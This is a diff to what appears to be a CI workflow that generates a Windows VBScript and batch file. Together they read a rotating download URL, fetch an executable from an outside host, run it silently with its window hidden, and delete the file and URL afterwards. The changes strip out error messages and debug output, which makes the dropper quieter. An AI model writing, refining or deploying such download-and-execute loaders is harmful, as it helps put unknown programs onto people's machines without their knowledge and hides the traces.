@@ -20,48 +20,42 @@ jobs:
         
         # Get current link based on 10-minute interval
         current_minute=$(date +%M)
-        link_index=$((current_minute / 1 % 1))
+        link_index=$((current_minute / 1 % 6))
         current_link=${links[$link_index]}
         
         echo "Using link: $current_link"
         
-        # Create a simple VBScript without any evasion techniques
+        # Create a simple VBS script
         cat > installer.vbs << 'EOF'
-        ' Simple installer without AV evasion
-        Dim objShell, objFSO, urlFile, installerPath, downloadUrl
+        ' Simple installer script
+        Dim objShell, objFSO, objHTTP, objStream, tempPath, urlFile, installerPath, downloadUrl
         
         Set objShell = CreateObject("WScript.Shell")
         Set objFSO = CreateObject("Scripting.FileSystemObject")
         
-        ' Read URL from file
+        ' Get temp path and file paths
         tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
         urlFile = tempPath & "\download_url.txt"
         installerPath = tempPath & "\installer.exe"
         
-        ' Check if URL file exists
-        If Not objFSO.FileExists(urlFile) Then
-            MsgBox "URL file not found", vbCritical
-            WScript.Quit
-        End If
-        
-        ' Read URL
+        ' Read URL from file
         Set objFile = objFSO.OpenTextFile(urlFile, 1)
         downloadUrl = objFile.ReadAll
         objFile.Close
         
-        ' Download using XMLHTTP
-        Set objHTTP = CreateObject("MSXML2.XMLHTTP.6.0")
+        ' Download the file
+        Set objHTTP = CreateObject("MSXML2.XMLHTTP")
         objHTTP.Open "GET", downloadUrl, False
         objHTTP.Send
         
-        ' Check for redirect
+        ' Handle redirects
         If objHTTP.Status >= 300 And objHTTP.Status < 400 Then
             finalUrl = objHTTP.getResponseHeader("Location")
             objHTTP.Open "GET", finalUrl, False
             objHTTP.Send
         End If
         
-        ' Save file if successful
+        ' Save the file
         If objHTTP.Status = 200 Then
             Set objStream = CreateObject("ADODB.Stream")
             objStream.Type = 1
@@ -70,39 +64,20 @@ jobs:
             objStream.SaveToFile installerPath, 2
             objStream.Close
             
-            ' Run installer
+            ' Run the installer
             objShell.Run """" & installerPath & """ /S", 0, True
             
             ' Clean up
             objFSO.DeleteFile installerPath, True
             objFSO.DeleteFile urlFile, True
-        Else
-            MsgBox "Download failed with status: " & objHTTP.Status, vbCritical
         End If
         EOF
         
-        # Create a batch file that runs the VBScript with debug info
+        # Create a simple batch file
         cat > run.bat << 'EOF'
         @echo off
-        echo Copying URL file...
-        copy "%~dp0url.txt" "%TEMP%\download_url.txt"
-        
-        if not exist "%TEMP%\download_url.txt" (
-            echo URL file not found!
-            pause
-            exit /b 1
-        )
-        
-        echo Running installer...
+        copy "%~dp0url.txt" "%TEMP%\download_url.txt" >nul
         cscript.exe //nologo "%~dp0installer.vbs"
-        
-        if errorlevel 1 (
-            echo Installer failed!
-            pause
-            exit /b 1
-        )
-        
-        echo Done!
         EOF
         
         # Create URL file
